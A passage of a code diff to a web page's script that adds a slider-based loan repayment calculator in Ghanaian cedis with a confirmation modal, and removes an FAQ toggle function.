+        const amountDisplay = document.getElementById('amount-display');
+        const termDisplay = document.getElementById('term-display');
+        const paymentDisplay = document.getElementById('payment-display');
+
+        function calculateRepayment() {
+            const principal = parseFloat(amountSlider.value);
+            const days = parseFloat(termSlider.value);
+            const dailyRate = 0.0038; // Realistic rate
+            const interest = principal * dailyRate * days;
+            const total = Math.round(principal + interest);
+
+            amountDisplay.textContent = `GHS ${principal.toLocaleString()}`;
+            termDisplay.textContent = `${days} days`;
+            paymentDisplay.textContent = `GHS ${total.toLocaleString()}`;
         }
 
-        function toggleFAQ(button) {
-            const answer = button.nextElementSibling;
-            const isActive = button.classList.contains('active');
-            
-            // Close all other FAQs
-            document.querySelectorAll('.faq-question.active').forEach(q => {
-                if (q !== button) {
-                    q.classList.remove('active');
-                    q.nextElementSibling.classList.remove('active');
-                }
-            });
-            
-            // Toggle current FAQ
-            button.classList.toggle('active');
-            answer.classList.toggle('active');
+        amountSlider.addEventListener('input', calculateRepayment);
+        termSlider.addEventListener('input', calculateRepayment);
+        calculateRepayment();
+
+        // Modal
+        function showLoanModal() {
+            const amount = amountSlider.value;
+            const days = termSlider.value;
+            const repayment = paymentDisplay.textContent;
+
+            document.getElementById('modalTitle').textContent = `GHS ${parseFloat(amount).toLocaleString()} Loan`;
+            document.getElementById('modalMessage').innerHTML = `
+                Duration: <strong>${days} days</strong><br>
+                Total Repayment: <strong>${repayment}</strong>
+            `;
+            document.getElementById('loanModal').style.display = 'flex';
         }
+
+        function closeModal() {
+            document.getElementById('loanModal').style.display = 'none';
+        }
+
+        document.getElementById('apply-btn').addEventListener('click', showLoanModal);
+
+        document.getElementById('confirmBtn').addEventListener('click', () => {
+            closeModal();
+            alert("✅ Redirecting to secure loan application page...");
+            // window.location.href = `apply.html?amount=${amountSlider.value}&days=${termSlider.value}`;
+        });
+
+        // Close modal on outside click
+        document.getElementById('loanModal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
     </script>
 </body>
 </html>
